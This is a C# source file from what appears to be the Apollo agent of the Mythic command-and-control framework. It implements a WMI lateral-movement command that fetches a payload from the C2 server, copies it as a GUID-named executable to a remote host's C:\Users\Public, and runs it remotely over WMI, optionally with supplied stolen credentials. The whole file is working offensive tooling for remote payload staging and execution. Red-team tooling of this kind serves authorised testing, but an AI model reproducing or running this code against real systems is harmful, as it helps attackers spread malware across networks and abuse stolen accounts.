#define COMMAND_NAME_UPPER

#if DEBUG
#undef PIVOT_WMI_PROCESS_CREATE
#define PIVOT_WMI_PROCESS_CREATE
#endif

#if PIVOT_WMI_PROCESS_CREATE

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Mythic.Structs;
using Apollo.Credentials;
using Apollo.Jobs;
using Apollo.Tasks;
using Apollo.Utils;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Apollo.CommandModules.LateralMovement
{
    public struct WMIProcessExecuteParameters
    {
        public string computer;
        public string template;
        public string remote_path;
        public string credential;
    }

    public class WMIProcessExecute
    {
        public static void Execute(Job job, Agent agent)
        {
            WMIProcessExecuteParameters parameters = (WMIProcessExecuteParameters)JsonConvert.DeserializeObject<WMIProcessExecuteParameters>(job.Task.parameters);
            ApolloTaskResponse resp;
            MythicCredential cred = new MythicCredential();
            bool success;
            byte[] templateFile;
            string username = null;
            string password = null;
            string formattedRemotePath = null;
            string fileGuid = Guid.NewGuid().ToString();

            if (string.IsNullOrEmpty(parameters.computer))
            {
                job.SetError("No computer name passed.");
                return;
            }

            if (string.IsNullOrEmpty(parameters.template))
            {
                job.SetError("No template was given to download.");
                return;
            }
            if (!string.IsNullOrEmpty(parameters.credential))
            {
                cred = JsonConvert.DeserializeObject<MythicCredential>(parameters.credential);
            }
            string remotePath = parameters.remote_path;
            if (string.IsNullOrEmpty(parameters.remote_path))
            {
                formattedRemotePath = $"\\\\{parameters.computer}\\C$\\Users\\Public\\{fileGuid}.exe";
                remotePath = $"C:\\Users\\Public\\{fileGuid}.exe";
            }
            else
            {
                if (Directory.Exists(parameters.remote_path))
                {
                    parameters.remote_path = Path.Combine(parameters.remote_path, $"{fileGuid}.exe");
                }
                remotePath = parameters.remote_path;
                //formattedRemotePath = $"\\\\{parameters.computer}\\{parameters.remote_path.Replace(':', '$')}";
            }

            try
            {
                templateFile = agent.Profile.GetFile(job.Task.id, parameters.template, agent.Profile.ChunkSize);
            }
            catch (Exception ex)
            {
                job.SetError($"Error fetching remote file: {ex.Message}");
                return;
            }

            if (templateFile == null || templateFile.Length == 0)
            {
                job.SetError($"File ID {parameters.template} was of zero length.");
                return;
            }

            try
            {
                File.WriteAllBytes(remotePath, templateFile);
                resp = new ApolloTaskResponse(job.Task, $"Copied payload to {remotePath}");
                job.AddOutput(resp);
            }
            catch (Exception ex)
            {
                job.SetError($"Remote file copy to {remotePath} failed. Reason: {ex.Message}");
                return;
            }


            if (!string.IsNullOrEmpty(cred.account))
            {
                username = cred.account;
                if (!string.IsNullOrEmpty(cred.realm))
                    username = cred.realm + "\\" + username;
                password = cred.credential;
            }

            success = WMIUtils.RemoteWMIExecute(parameters.computer, remotePath, out string[] results, username, password);
            job.SetComplete(string.Join("\n", results));
        }
    }
}
#endif